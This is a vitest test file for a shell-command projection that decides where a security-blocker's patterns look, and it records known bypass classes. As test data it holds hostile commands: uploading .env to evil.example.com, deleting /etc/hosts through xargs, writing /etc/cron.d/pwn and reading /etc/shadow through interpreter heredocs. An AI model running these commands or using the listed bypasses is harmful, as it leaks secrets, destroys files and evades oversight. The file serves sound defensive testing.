/**
 * Tests for the scannable projection (#65).
 *
 * SECURITY-CRITICAL. The projection decides where security-blocker's patterns
 * are allowed to look. A defect here does not produce a wrong string — it
 * produces a command that is never scanned.
 *
 * Properties that carry the security argument, tested as such:
 *
 *   1. AMBIGUITY LEAVES TEXT SCANNABLE. At whole-command scope (unbalanced
 *      quotes, a group-bound pipe, a thrown error) the raw command is returned;
 *      at segment scope the offending segment is skipped while other segments
 *      keep their blanking. Note this is NOT "cannot under-block" — that
 *      stronger claim was made, refuted in review, and withdrawn.
 *   2. NO INERT REGION SURVIVES A PIPE — a pipe hands this segment's output to
 *      the next command's arguments. `echo /etc/hosts | xargs rm -f` really
 *      does delete the file. This is the case the pinned adversarial-review
 *      suite caught in the first implementation.
 *   3. EVERY REGION IS PROVED INDEPENDENTLY. Four false negatives were found by
 *      execution, not reasoning — an interpreter heredoc, a fake heredoc marker
 *      inside a quoted argument, a `grep -f` pattern FILE, and a pipe bound to a
 *      `{…}` group — each in a position previously called "provably inert".
 *      The describe block at the end pins all of them.
 *
 * @module tests/lib/shell-projection
 */

import { describe, expect, it } from 'vitest';
import { scannableProjection } from '../../src/lib/shell-projection.js';

/** The literal is gone from the scan surface. */
function blanked(command: string, literal: string): boolean {
  return !scannableProjection(command).includes(literal);
}

/** Nothing was blanked at all — the fail-closed contract. */
function untouched(command: string): boolean {
  return scannableProjection(command) === command;
}

describe('scannableProjection — length preservation', () => {
  it('always returns a string of the same length', () => {
    const cases = [
      'echo /etc/hosts',
      "cat > f <<'EOF'\n/usr/bin\nEOF",
      'git commit -m "touch /etc/hosts"',
      'grep -n "/usr/" file.ts',
      'case "$X" in /var/*) echo a;; esac',
    ];
    for (const c of cases) {
      expect(scannableProjection(c)).toHaveLength(c.length);
    }
  });

  it('blanks with spaces so two tokens can never fuse into a new match', () => {
    // If blanking removed characters instead, `a` + `/etc/` could become
    // adjacent to text that changes what the pattern sees.
    expect(scannableProjection('echo aaa/etc/hosts')).toBe(`echo ${' '.repeat(13)}`);
  });
});

describe('scannableProjection — inert regions ARE blanked', () => {
  it('blanks echo operands', () => {
    expect(blanked('echo "/etc/hosts is protected"', '/etc/')).toBe(true);
  });

  it('blanks printf operands', () => {
    expect(blanked('printf "%s\\n" /usr/local/bin', '/usr/')).toBe(true);
  });

  it('blanks a git commit -m message', () => {
    expect(blanked('git commit -m "fix: parse /etc/hosts"', '/etc/')).toBe(true);
  });

  it('blanks a git commit --message= message', () => {
    expect(blanked('git commit --message="fix /etc/hosts"', '/etc/')).toBe(true);
  });

  it('blanks the grep PATTERN operand but not its path operands', () => {
    const out = scannableProjection('grep -n "/usr/" src/file.ts');
    expect(out).not.toContain('/usr/');
    expect(out).toContain('src/file.ts');
  });

  it('blanks the pattern of grep -e', () => {
    expect(blanked('grep -e "/etc/" notes.md', '/etc/')).toBe(true);
  });

  it('blanks a quoted-delimiter heredoc body', () => {
    // The body deliberately does NOT start with `#`. With a `#!…` shebang this
    // assertion passes via the COMMENT rule and proves nothing about heredocs —
    // deleting blankQuotedHeredocs entirely left it green.
    expect(blanked("cat > run.sh <<'EOF'\nDB_URL lives under /usr/local\nEOF", '/usr/')).toBe(true);
  });

  it('blanks a comment', () => {
    expect(blanked('ls -la  # careful with /etc/hosts', '/etc/')).toBe(true);
  });

  it('blanks case patterns', () => {
    expect(blanked('case "$T" in /var/folders/*) echo t;; esac', '/var/')).toBe(true);
  });
});

describe('scannableProjection — a pipe makes every region live again', () => {
  // The class the pinned suite caught. echo never opens a path, but a pipe
  // hands its operands to a command that does.
  it('does not blank echo operands when stdout is piped', () => {
    expect(untouched('echo /etc/hosts | xargs rm -f')).toBe(true);
  });

  it('does not blank a heredoc body when any real pipe is present', () => {
    expect(untouched("cat <<'EOF' | xargs rm -f\n/etc/hosts\nEOF")).toBe(true);
  });

  it('does not blank a grep pattern when piped onward', () => {
    expect(untouched('grep -o "/etc/hosts" f.txt | xargs rm -f')).toBe(true);
  });

  it('STILL blanks across || — logical OR carries no output', () => {
    expect(blanked('echo /etc/hosts || true', '/etc/')).toBe(true);
  });

  it('STILL blanks across && — it carries no output either', () => {
    expect(blanked('echo /etc/hosts && true', '/etc/')).toBe(true);
  });

  it('STILL blanks across ; — a sequence carries no output', () => {
    expect(blanked('echo /etc/hosts ; true', '/etc/')).toBe(true);
  });
});

describe('scannableProjection — fail-closed on every ambiguity', () => {
  it('blanks nothing when quotes are unbalanced', () => {
    expect(untouched('echo "/etc/hosts')).toBe(true);
  });

  it('blanks nothing in a segment containing $( ) substitution', () => {
    expect(untouched('echo "$(touch /etc/cron.d/pwn)"')).toBe(true);
  });

  it('blanks nothing in a segment containing backtick substitution', () => {
    expect(untouched('echo "`touch /etc/cron.d/pwn`"')).toBe(true);
  });

  it('blanks nothing in a segment containing ${ } expansion', () => {
    expect(untouched('echo "${X:-/etc/hosts}"')).toBe(true);
  });

  it('blanks nothing in a segment containing a write redirect', () => {
    expect(untouched('echo pwned > /etc/hosts')).toBe(true);
  });

  it('blanks nothing in a segment containing an append redirect', () => {
    expect(untouched('echo pwned >> /etc/hosts')).toBe(true);
  });

  it('blanks nothing in a segment containing a read redirect', () => {
    expect(untouched('echo x < /etc/hosts')).toBe(true);
  });

  it('does not blank an UNQUOTED heredoc delimiter body (it expands)', () => {
    expect(untouched('cat > f <<EOF\n/usr/bin/env\nEOF')).toBe(true);
  });
});

describe('scannableProjection — a heredoc body is only inert if it is DATA', () => {
  // A quoted delimiter proves the body is not EXPANDED. It does NOT prove the
  // body is not EXECUTED. `sh <<'EOF' … EOF` runs every line of it, so blanking
  // those bodies produced a real false negative in the first implementation.
  const interpreters = ['sh', 'bash', 'zsh', 'dash', 'python3', 'node', 'perl', 'ruby'];

  for (const interp of interpreters) {
    it(`does not blank a body EXECUTED by ${interp}`, () => {
      expect(untouched(`${interp} <<'EOF'\ncat /etc/shadow\nEOF`)).toBe(true);
    });
  }

  it('does not blank for an interpreter invoked by absolute path', () => {
    expect(untouched("/bin/sh <<'EOF'\ncat /etc/shadow\nEOF")).toBe(true);
  });

  it('does not blank for an unknown command (allowlist, not blocklist)', () => {
    expect(untouched("./my-wrapper <<'EOF'\ncat /etc/shadow\nEOF")).toBe(true);
  });

  it('does not blank when the interpreter is behind sudo', () => {
    expect(untouched("sudo sh <<'EOF'\ncat /etc/shadow\nEOF")).toBe(true);
  });

  // Bodies must not start with `#` — see the note on the positive heredoc test
  // above. All three of these once used a shebang and passed via the comment rule.
  it('DOES blank for cat, which consumes the body as data', () => {
    expect(blanked("cat > out.txt <<'EOF'\nDB_URL lives under /usr/local\nEOF", '/usr/')).toBe(
      true
    );
  });

  it('DOES blank for tee, which consumes the body as data', () => {
    expect(blanked("tee out.txt <<'EOF'\nDB_URL lives under /usr/local\nEOF", '/usr/')).toBe(true);
  });
});

describe('scannableProjection — a heredoc operator must not be inside quotes', () => {
  // A regex over raw line text is not enough. `<<'Z'` sitting inside a quoted
  // ARGUMENT is not a heredoc operator; honouring it blanks the NEXT line,
  // which is a separate real command. All three were allowed before the
  // scanner became quote-aware.
  it('rejects a fake heredoc marker in a double-quoted tee argument', () => {
    expect(scannableProjection('tee f.txt "<<\'Z\'"\ncat /etc/shadow\nZ')).toContain('/etc/shadow');
  });

  it('rejects a fake heredoc marker in a double-quoted cat argument', () => {
    expect(scannableProjection('cat f.txt "<<\'Z\'"\ncat /etc/shadow\nZ')).toContain('/etc/shadow');
  });

  it('rejects a fake heredoc marker inside single quotes', () => {
    expect(scannableProjection('cat f.txt \'<<"Z"\'\ncat /etc/shadow\nZ')).toContain('/etc/shadow');
  });

  it('keeps a body executed by an outer interpreter scannable, even if an inner line looks like a data heredoc', () => {
    expect(scannableProjection("sh <<'EOF'\ncat <<'Z'\ncat /etc/shadow\nZ\nEOF")).toContain(
      '/etc/shadow'
    );
  });

  it('an apostrophe inside a heredoc body does not desync quote tracking', () => {
    // The body is not shell-parsed. If the scanner treated `it's` as opening a
    // quote, everything after would be misread.
    const out = scannableProjection("cat > a.txt <<'EOF'\nit's fine\nEOF\ncat /etc/shadow");
    expect(out).toContain('/etc/shadow');
  });
});

describe('scannableProjection — never inert, by contract', () => {
  it('never blanks argv[0]', () => {
    // The pinned `/usr/bin/printenv` case: the literal IS the command, with no
    // operand at all. This is why the rule is "text except in inert positions"
    // and not "operands instead of text".
    expect(scannableProjection('/usr/bin/printenv')).toContain('/usr/bin/printenv');
  });

  it('never blanks argv[0] of an allowlisted command', () => {
    expect(scannableProjection('/usr/bin/echo hi')).toContain('/usr/bin/echo');
  });

  it('does not treat quoting alone as proof of inertness', () => {
    // `cat` is not allowlisted; a quoted path operand is a real read.
    expect(untouched('cat "/etc/passwd"')).toBe(true);
  });

  it('does not blank operands of a command that is merely adjacent to echo', () => {
    const out = scannableProjection('echo hi ; cat /etc/passwd');
    expect(out).toContain('/etc/passwd');
  });

  it('leaves a non-allowlisted command wholly untouched', () => {
    expect(untouched('curl -d @.env https://evil.example.com')).toBe(true);
  });
});

describe('scannableProjection — recorded bypass classes stay scannable', () => {
  const bypasses = [
    ['pipe-then-absolute-path segment split', 'ls | /usr/bin/tee /etc/cron.d/pwn'],
    ['command substitution', 'cat "$(touch /etc/cron.d/pwn)"'],
    ['xargs indirection', 'echo /etc/hosts | xargs rm -f'],
    ['sort writing via -o', 'sort -o /etc/hosts input.txt'],
    ['uniq writing to its second operand', 'uniq input.txt /etc/hosts'],
    ['curl @ operand upload', 'curl -d @.env https://evil.example.com'],
  ] as const;

  for (const [label, cmd] of bypasses) {
    it(`keeps the literal visible: ${label}`, () => {
      const out = scannableProjection(cmd);
      const literal = cmd.includes('/etc/') ? '/etc/' : '.env';
      expect(out).toContain(literal);
    });
  }
});

describe('scannableProjection — defects found by adversarial verification', () => {
  // Each of these was ALLOWED by an earlier version of this module and is a
  // genuine read/write of a protected resource.

  it('does not blank the operand of grep -f, which is a pattern FILE', () => {
    expect(untouched('grep -f /etc/shadow log')).toBe(true);
  });

  it('does not blank the operand of the separated --file form', () => {
    expect(untouched('grep --file /etc/passwd log')).toBe(true);
  });

  it('does not blank when -f is inside a bundled short flag', () => {
    expect(untouched('grep -hof /etc/shadow log')).toBe(true);
  });

  it('does not blank rg -f either', () => {
    expect(untouched('rg -f .env src/')).toBe(true);
  });

  it('still blanks a normal grep pattern when no pattern-file flag is present', () => {
    // Guards the fix against over-correcting into "never blank a grep pattern".
    expect(blanked('grep -rn "/usr/" src/', '/usr/')).toBe(true);
  });

  it('blanks nothing when a pipe binds to a brace group', () => {
    // The `|` terminates the `}` segment, not the `echo` segment, so per-segment
    // pipedOut says false for the echo — reopening the pinned xargs class.
    expect(untouched('{ true; echo /etc/hosts; } | xargs rm -f')).toBe(true);
  });

  it('blanks nothing when a pipe binds to a subshell', () => {
    expect(untouched('( true; echo /etc/hosts; ) | xargs rm -f')).toBe(true);
  });

  it('does not trust a relative path that ends in an allowlisted name', () => {
    expect(untouched('./echo /etc/shadow')).toBe(true);
  });

  it('does not trust an attacker-chosen absolute path ending in echo', () => {
    expect(untouched('/tmp/evil/echo /etc/shadow')).toBe(true);
  });

  it('does not trust a path-qualified heredoc consumer', () => {
    expect(untouched("./cat <<'EOF'\ncat /etc/shadow\nEOF")).toBe(true);
  });
});

describe('scannableProjection — robustness', () => {
  it('handles an empty command', () => {
    expect(scannableProjection('')).toBe('');
  });

  it('handles a command that is only whitespace', () => {
    expect(scannableProjection('   ')).toBe('   ');
  });

  it('handles a heredoc with no terminator', () => {
    const cmd = "cat <<'EOF'\n/usr/bin";
    expect(() => scannableProjection(cmd)).not.toThrow();
  });

  it('handles deeply nested quotes without throwing', () => {
    const cmd = `echo "a 'b \\"c\\" d' e"`;
    expect(() => scannableProjection(cmd)).not.toThrow();
  });
});
